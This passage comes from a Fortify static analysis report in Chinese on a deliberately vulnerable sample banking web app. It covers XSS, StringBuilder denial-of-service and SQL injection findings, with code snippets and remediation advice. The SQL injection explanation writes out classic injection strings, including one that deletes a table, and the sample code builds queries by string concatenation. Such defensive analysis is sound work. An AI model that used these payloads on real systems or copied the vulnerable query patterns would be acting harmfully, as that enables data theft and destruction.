许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，该规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。

由于 XSS 漏洞出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。

由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储或其他可信赖的数据源接受输入，而该数据存储所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。

针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，在写入代码时，这些字符仍应被视为合法的输入，比如一个 Web 设计版就必须接受带有 HTML 代码片段的输入。

更灵活的解决方法称为黑名单方法，但其安全性较差，这种方法在进行输入之前就有选择地拒绝或避免了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：

在有关块级别元素的内容中（位于一段文本的中间）：

－“&lt;”是一个特殊字符，因为它可以引入一个标签。

－“&amp;”是一个特殊字符，因为它可以引入一个字符实体。

－“&gt;”是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个“&lt;”，却错误地将其遗漏了。

下面的这些原则适用于属性值：

－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。

－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。

－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。

-“&amp;”与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。

例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：

－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。

-“&amp;”是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。

- 非 ASCII 字符（即 ISO-8859-1 编码表中所有大于 127 的字符）不允许出现在 URL 中，因此这些字符在此环境下被视为特殊字符。

－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的“%”符号。例如，当输入中出现“%68%65%6C%6C%6F”时，只有从输入的内容中过滤掉“%”，上述字符串才能在网页上显示为“hello”。


在 &lt;SCRIPT&gt; &lt;/SCRIPT&gt; 的正文内：

- 如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。

服务器端脚本：

－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (")，则可能需要对此进行更多过滤。

其他可能出现的情况：

－ 如果攻击者在 UTF-7 中提交了一个请求，那么特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切定义编码格式的网页中，有些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。

在应用程序中确定针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符之后，下一个难点就是确定验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。

如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。

许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. Fortify 安全编码规则包将就 SQL Injection 和 Access Control 提出警告：当把不可信赖的数据写入数据库时，数据库将出现问题，并且会将数据库当作不可信赖的数据的来源，这会导致 XSS 漏洞。如果数据库在您的环境中是可信赖的资源，则使用自定义筛选器筛选出包含 DATABASE 污染标志或来自数据库源的数据流问题。尽管如此，对所有从数据库中读取的内容进行验证仍然是较好的做法。

2. 虽然使用 URL 对不可信数据进行编码可以防止许多 XSS 攻击，但部分浏览器（尤其是 Internet Explorer 6 和 7 以及其他浏览器）在将数据传递给 JavaScript 解释器之前，会自动在文档对象模型 (DOM) 中的特定位置对其内容进行解码。为了反映出其危险之处，规则包不再认为 URL 编码例程足以防御 cross-site scripting 攻击。如果对数据值进行 URL 编码并随后输出，Fortify 将会报告存在 Cross-Site Scripting: Poor Validation 漏洞。

3. 要区分经过编码与未经过编码的数据，请使用数据验证项目模板，该模板会根据应用于输入源的编码类型按文件夹对问题进行分组。

4. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>5</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="A61CDFDB132BFD646241F0D05FBBB1AF" ruleID="25B00DD0-3038-4FB8-9C82-3E84EC2C3B58">
                            <Category>Cross-Site Scripting: Poor Validation</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>career_details_error.jsp 中的 _jspService() 方法会使用 HTML、XML 或其他类型的编码，这种编码并不总是能够防止恶意代码访问 Web 浏览器。</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
                                <FileName>career_details_error.jsp</FileName>
                                <FilePath>pages/career_details_error.jsp</FilePath>
                                <LineStart>20</LineStart>
                                <Snippet>${stackTrace}
Request URL : ${pageContext.request.requestURL}
Request URI : ${pageContext.request.requestURI}
Query string : ${pageContext.request.queryString}
External URI : ${externalUri}</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>career_details_error.jsp</FileName>
                                <FilePath>pages/career_details_error.jsp</FilePath>
                                <LineStart>20</LineStart>
                                <Snippet>${stackTrace}
Request URL : ${pageContext.request.requestURL}
Request URI : ${pageContext.request.requestURI}
Query string : ${pageContext.request.queryString}
External URI : ${externalUri}</Snippet>
                                <TargetFunction>javax.servlet.http.HttpServletRequest.getRequestURI()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="31C43088727BE54C618ADD6392F682B6" ruleID="25B00DD0-3038-4FB8-9C82-3E84EC2C3B58">
                            <Category>Cross-Site Scripting: Poor Validation</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>career_details_error.jsp 中的 _jspService() 方法会使用 HTML、XML 或其他类型的编码，这种编码并不总是能够防止恶意代码访问 Web 浏览器。</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
                                <FileName>career_details_error.jsp</FileName>
                                <FilePath>pages/career_details_error.jsp</FilePath>
                                <LineStart>19</LineStart>
                                <Snippet>    &lt;textarea id="stacktrace" rows="10" cols="60" readonly="true"&gt;
${stackTrace}
Request URL : ${pageContext.request.requestURL}
Request URI : ${pageContext.request.requestURI}
Query string : ${pageContext.request.queryString}</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>career_details_error.jsp</FileName>
                                <FilePath>pages/career_details_error.jsp</FilePath>
                                <LineStart>19</LineStart>
                                <Snippet>    &lt;textarea id="stacktrace" rows="10" cols="60" readonly="true"&gt;
${stackTrace}
Request URL : ${pageContext.request.requestURL}
Request URI : ${pageContext.request.requestURI}
Query string : ${pageContext.request.queryString}</Snippet>
                                <TargetFunction>javax.servlet.http.HttpServletRequest.getRequestURL()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B9BFCE4B20B053820D6087CD5D24384B" ruleID="75CA7134-B6BE-444A-9815-E739432FCA47">
                            <Category>Cross-Site Scripting: Poor Validation</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewMessage.jsp 中的 _jspService() 方法会使用 HTML、XML 或其他类型的编码，这种编码并不总是能够防止恶意代码访问 Web 浏览器。</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
                                <FileName>ViewMessage.jsp</FileName>
                                <FilePath>pages/content/ViewMessage.jsp</FilePath>
                                <LineStart>26</LineStart>
                                <Snippet>						&lt;tr class="dataCell" align="left"&gt;
						    &lt;td&gt;&amp;nbsp;From:&lt;/td&gt;
						    &lt;td&gt;&lt;c:out value="${sender}"/&gt;&lt;/td&gt;
						&lt;/tr&gt;
						&lt;tr class="dataCell alt" align="left"&gt;</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>71</LineStart>
                                <Snippet>        String queryStr = "from Message message where message.id = " + id;
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();
		</Snippet>
                                <TargetFunction>net.sf.hibernate.Query.list()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B9FBBE3B3DEEFD6E663D2BF87D7E9F00" ruleID="75CA7134-B6BE-444A-9815-E739432FCA47">
                            <Category>Cross-Site Scripting: Poor Validation</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>error.jsp 中的 _jspService() 方法会使用 HTML、XML 或其他类型的编码，这种编码并不总是能够防止恶意代码访问 Web 浏览器。</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
                                <FileName>error.jsp</FileName>
                                <FilePath>pages/error.jsp</FilePath>
                                <LineStart>9</LineStart>
                                <Snippet>&lt;% java.util.Random r = new java.util.Random(); %&gt;
&lt;h1&gt;
    An Error has occurred. Please contact your sys admin. Error code: &lt;%= r.nextInt() + "" %&gt; . Page: ${pageContext.request.requestURI}.
&lt;/h1&gt;
Date stamp: &lt;%= d.toString() %&gt;.</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>error.jsp</FileName>
                                <FilePath>pages/error.jsp</FilePath>
                                <LineStart>9</LineStart>
                                <Snippet>&lt;% java.util.Random r = new java.util.Random(); %&gt;
&lt;h1&gt;
    An Error has occurred. Please contact your sys admin. Error code: &lt;%= r.nextInt() + "" %&gt; . Page: ${pageContext.request.requestURI}.
&lt;/h1&gt;
Date stamp: &lt;%= d.toString() %&gt;.</Snippet>
                                <TargetFunction>javax.servlet.http.HttpServletRequest.getRequestURI()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B9BFCE4B20B053820D6087CD5D24384C" ruleID="75CA7134-B6BE-444A-9815-E739432FCA47">
                            <Category>Cross-Site Scripting: Poor Validation</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewMessage.jsp 中的 _jspService() 方法会使用 HTML、XML 或其他类型的编码，这种编码并不总是能够防止恶意代码访问 Web 浏览器。</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
                                <FileName>ViewMessage.jsp</FileName>
                                <FilePath>pages/content/ViewMessage.jsp</FilePath>
                                <LineStart>30</LineStart>
                                <Snippet>						&lt;tr class="dataCell alt" align="left"&gt;
						    &lt;td&gt;&amp;nbsp;Subject:&lt;/td&gt;
						    &lt;td&gt;&lt;c:out value="${subject}"/&gt;&lt;/td&gt;
						&lt;/tr&gt;
						&lt;c:if test='${severity != null &amp;&amp; severity != "Low"}'&gt;</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>71</LineStart>
                                <Snippet>        String queryStr = "from Message message where message.id = " + id;
        Query query = session.createQuery(queryStr);
        List messages = query.list();
        session.close();
		</Snippet>
                                <TargetFunction>net.sf.hibernate.Query.list()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Denial of Service: StringBuilder</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>调用 AccountService.java 中第 318 行的 append() 会将不受信任的数据附加到使用默认支持数组大小 (16) 进行初始化的 StringBuilder 实例。这会导致 JVM 过度使用堆内存空间。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>将用户控制的数据附加到使用默认支持字符数组大小 (16) 进行初始化的 StringBuilder 实例，会导致应用程序在调整基础数组的大小以适应用户数据时占用大量堆内存。每次新数据附加到 StringBuilder 实例时，它都会尝试使数据适应其支持字符数组。如果数据不合适，将会创建新的数组，大小为之前的两倍，而旧数组在进行回收之前，将继续留在堆中。此缺陷可被攻击者用于执行拒绝服务 (DoS) 攻击。

示例 1：用户控制的数据附加到使用默认构造函数进行初始化的 StringBuilder 实例。

    ...
    StringBuilder sb = new StringBuilder();
    sb.append(request.getParameter("foo"));
    ...
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>使用大小与预期数据的长度相当的数组初始化 StringBuilder，以减少调整支持数组大小的次数。在将数据附加到 StringBuilder 实例前，检查数据大小。

示例 2：用户控制的数据附加到使用默认构造函数进行初始化的 StringBuilder 实例。

    ...
    private final int MAX_DATA = 128;
    private final int EXPECTED_BUFFER_DATA = 1024;
    StringBuilder sb = new StringBuilder(EXPECTED_BUFFER_DATA);
    ...
    String data = request.getParameter("foo");
    if (data.length() &lt; MAX_DATA) sb.append(data);
    ...
</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>5</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="5BEE0E0F4F29EA6DA7E69022B238638A" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>调用 ProfileService.java 中第 247 行的 append() 会将不受信任的数据附加到使用默认支持数组大小 (16) 进行初始化的 StringBuilder 实例。这会导致 JVM 过度使用堆内存空间。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ProfileService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/ProfileService.java</FilePath>
                                <LineStart>247</LineStart>
                                <Snippet>        {
            session = ConnectionFactory.getInstance().getSession();
            List ret = session.find((new StringBuilder()).append("select profile.username from Profile profile where username='").append(username).append("'").toString());
            if(ret.size() &lt;= 0)
            {</Snippet>
                                <TargetFunction>java.lang.StringBuilder.append()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/AccountResources.java</FilePath>
                                <LineStart>82</LineStart>
                                <Snippet>    @Path("{username}/json")
    @Produces("application/json")
    public String GetAccountsByName_JSON(@PathParam("username") String username) {
        try {
            if(!ProfileService.IsProfileExist(username)) {</Snippet>
                                <TargetFunction>GetAccountsByName_JSON(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DAF3E3602C86DD8134813B9B4309DF93" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>调用 ProfileService.java 中第 247 行的 append() 会将不受信任的数据附加到使用默认支持数组大小 (16) 进行初始化的 StringBuilder 实例。这会导致 JVM 过度使用堆内存空间。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ProfileService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/ProfileService.java</FilePath>
                                <LineStart>247</LineStart>
                                <Snippet>        {
            session = ConnectionFactory.getInstance().getSession();
            List ret = session.find((new StringBuilder()).append("select profile.username from Profile profile where username='").append(username).append("'").toString());
            if(ret.size() &lt;= 0)
            {</Snippet>
                                <TargetFunction>java.lang.StringBuilder.append()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/AccountResources.java</FilePath>
                                <LineStart>62</LineStart>
                                <Snippet>    @Path("{username}")
    @Produces("application/xml")
    public String GetAccountsByName(@PathParam("username") String username) {
        try {
            if(!ProfileService.IsProfileExist(username)) {</Snippet>
                                <TargetFunction>GetAccountsByName(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="04A68488FD896ABE42D1623AF415CA5C" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>调用 AccountService.java 中第 318 行的 append() 会将不受信任的数据附加到使用默认支持数组大小 (16) 进行初始化的 StringBuilder 实例。这会导致 JVM 过度使用堆内存空间。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>318</LineStart>
                                <Snippet>        {
            session = ConnectionFactory.getInstance().getSession();
            List ret = session.find((new StringBuilder()).append("select account.acctno from Account account where acctno='").append(acctno).append("'").toString());
            if(ret.size() &lt;= 0)
            {</Snippet>
                                <TargetFunction>java.lang.StringBuilder.append()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/AccountResources.java</FilePath>
                                <LineStart>141</LineStart>
                                <Snippet>    @Path("{acctno}")
    @Produces("application/xml")
    public String DeleteAccount(@PathParam("acctno") String acctno) {
        try {
            if(!AccountService.IsAccountExist(acctno)) {</Snippet>
                                <TargetFunction>DeleteAccount(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7A44B2F88F2F2364A6CAB6FA2E57476E" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>调用 ProfileService.java 中第 247 行的 append() 会将不受信任的数据附加到使用默认支持数组大小 (16) 进行初始化的 StringBuilder 实例。这会导致 JVM 过度使用堆内存空间。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ProfileService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/ProfileService.java</FilePath>
                                <LineStart>247</LineStart>
                                <Snippet>        {
            session = ConnectionFactory.getInstance().getSession();
            List ret = session.find((new StringBuilder()).append("select profile.username from Profile profile where username='").append(username).append("'").toString());
            if(ret.size() &lt;= 0)
            {</Snippet>
                                <TargetFunction>java.lang.StringBuilder.append()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>TransactionResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/TransactionResources.java</FilePath>
                                <LineStart>101</LineStart>
                                <Snippet>    @Path("search/{username}:{acctno},{date}")
    @Produces("application/xml")
    public String GetTransactions(@PathParam("username") String username,
                           @PathParam("acctno") @DefaultValue("0422328325") String acctno,
                           @PathParam("date") String date,</Snippet>
                                <TargetFunction>GetTransactions(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D30837C104CA58B3DF6F5CED83302262" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>调用 TransactionResources.java 中第 112 行的 append() 会将不受信任的数据附加到使用默认支持数组大小 (16) 进行初始化的 StringBuilder 实例。这会导致 JVM 过度使用堆内存空间。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>TransactionResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/TransactionResources.java</FilePath>
                                <LineStart>112</LineStart>
                                <Snippet>            if(!ProfileService.IsProfileExist(username))
            {
                return (new StringBuilder()).append(username).append(" is not a customer.").toString();
            }
</Snippet>
                                <TargetFunction>java.lang.StringBuilder.append()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>TransactionResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/TransactionResources.java</FilePath>
                                <LineStart>101</LineStart>
                                <Snippet>    @Path("search/{username}:{acctno},{date}")
    @Produces("application/xml")
    public String GetTransactions(@PathParam("username") String username,
                           @PathParam("acctno") @DefaultValue("0422328325") String acctno,
                           @PathParam("date") String date,</Snippet>
                                <TargetFunction>GetTransactions(0)</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>SQL Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>在 LocationService.java 的第 110 行，findByZip() 方法调用通过不可信赖的数据源输入构建的 SQL 查询。通过这种调用，攻击者能够修改语句的含义或执行任意 SQL 命令。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>SQL injection 错误在以下情况下发生：

1. 数据从一个不可信赖的数据源进入程序。



2. 数据用于动态地构造一个 SQL 查询。



例 1：以下代码动态地构造并执行了一个 SQL 查询，该查询可以搜索与指定名称相匹配的项。该查询仅会显示条目所有者与被授予权限的当前用户一致的条目。


...
	String userName = ctx.getAuthenticatedUserName();
	String itemName = request.getParameter("itemName");
	String query = "SELECT * FROM items WHERE owner = '"
				+ userName + "' AND itemname = '"
				+ itemName + "'";
	ResultSet rs = stmt.execute(query);
...


查询计划执行以下代码：


	SELECT * FROM items
	WHERE owner = &lt;userName&gt;
	AND itemname = &lt;itemName&gt;;


但是，由于这个查询是动态构造的，由一个不变的基查询字符串和一个用户输入字符串连接而成，因此只有在 itemName 不包含单引号字符时，才会正确执行这一查询。如果一个用户名为 wiley 的攻击者为 itemName 输入字符串“name' OR 'a'='a”，那么查询就会变成：


	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name' OR 'a'='a';


附加条件 OR 'a'='a' 会使 where 从句永远评估为 true，因此该查询在逻辑上将等同于一个更为简化的查询：


	SELECT * FROM items;


通常，查询必须仅返回已通过身份验证的用户所拥有的条目，而通过以这种方式简化查询，攻击者就可以规避这一要求。现在，查询会返回存储在 items 表中的所有条目，而不论其指定所有者是谁。

示例 2：此示例说明了将不同的恶意值传递给Example 1.中构造和执行的查询所带来的影响。如果一个用户名为 wiley 的攻击者为 itemName 输入字符串“name'; DELETE FROM items; --”，则该查询就会变为以下两个查询：


	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name';

	DELETE FROM items;

	--'


众多数据库服务器，其中包括 Microsoft(R) SQL Server 2000，都可以一次性执行多条用分号分隔的 SQL 指令。对于那些不允许运行用分号分隔的批量指令的数据库服务器，比如 Oracle 和其他数据库服务器，攻击者输入的这个字符串只会导致错误；但是在那些支持这种操作的数据库服务器上，攻击者可能会通过执行多条指令而在数据库上执行任意命令。

注意末尾的一对连字符 (--)；这在大多数数据库服务器上都表示该语句剩余部分将视为注释，不会加以执行 [4]。在这种情况下，可通过注释字符删除修改后的查询遗留的末尾单引号。而在不允许通过这种方式使用注释的数据库上，攻击者通常仍可使用类似于Example 1.中所用的技巧进行攻击。如果攻击者输入字符串“name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a”，将创建以下三个有效语句：


	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name';

	DELETE FROM items;

	SELECT * FROM items WHERE 'a'='a';


有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 SQL injection）是无意义的 -- 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。

示例 3：以下代码会调整Example 1 以适应 Android 平台。


...
        PasswordAuthentication pa = authenticator.getPasswordAuthentication();
        String userName = pa.getUserName();
        String itemName = this.getIntent().getExtras().getString("itemName");
        String query = "SELECT * FROM items WHERE owner = '"
                                + userName + "' AND itemname = '"
                                + itemName + "'";
        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
        Cursor c = db.rawQuery(query, null);
...


避免 SQL injection 攻击的传统方法之一是，把它作为一个输入合法性检查的问题来处理，只接受列在白名单中的字符，或者识别并避免那些列在黑名单中的恶意数据。白名单方法是一种非常有效方法，它可以强制执行严格的输入检查规则，但是参数化的 SQL 指令所需维护更少，而且能提供更好的安全保障。而对于通常采用的列黑名单方式，由于总是存在一些小漏洞，所以并不能有效地防止 SQL injection 威胁。例如，攻击者可以：

    — 把没有被黑名单引用的值作为目标
    — 寻找方法以绕过对某一转义序列元字符的需要
    — 使用存储过程来隐藏注入的元字符

手动去除 SQL 查询中的元字符有一定的帮助，但是并不能完全保护您的应用程序免受 SQL injection 攻击。

防范 SQL injection 攻击的另外一种常用方式是使用存储过程。虽然存储过程可以阻止某些类型的 SQL injection 攻击，但是对于绝大多数攻击仍无能为力。存储过程有助于避免 SQL injection 的常用方式是限制可作为参数传入的指令类型。但是，有许多方法都可以绕过这一限制，许多危险的表达式仍可以传入存储过程。所以再次强调，存储过程在某些情况下可以避免这种攻击，但是并不能完全保护您的应用系统抵御 SQL injection 的攻击。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>造成 SQL injection 攻击的根本原因在于攻击者可以改变 SQL 查询的上下文，使程序员原本要作为数据解析的数值，被篡改为命令了。当构造一个 SQL 查询时，程序员应当清楚，哪些输入的数据将会成为命令的一部分，而哪些仅仅是作为数据。参数化 SQL 指令可以防止直接窜改上下文，避免几乎所有的 SQL injection 攻击。参数化 SQL 指令是用常规的 SQL 字符串构造的，但是当需要加入用户输入的数据时，它们就需要使用捆绑参数，这些捆绑参数是一些占位符，用来存放随后插入的数据。换言之，捆绑参数可以使程序员清楚地分辨数据库中的数据，即其中有哪些输入可以看作命令的一部分，哪些输入可以看作数据。这样，当程序准备执行某个指令时，它可以详细地告知数据库，每一个捆绑参数所使用的运行时的值，而不会被解析成对该命令的修改。

可以将例 1 改写成使用参数化 SQL 指令（替代用户输入连续的字符串），如下所示：


...
	String userName = ctx.getAuthenticatedUserName();
	String itemName = request.getParameter("itemName");
	String query = "SELECT * FROM items WHERE itemname=? AND owner=?";
	PreparedStatement stmt = conn.prepareStatement(query);
	stmt.setString(1, itemName);
	stmt.setString(2, userName);
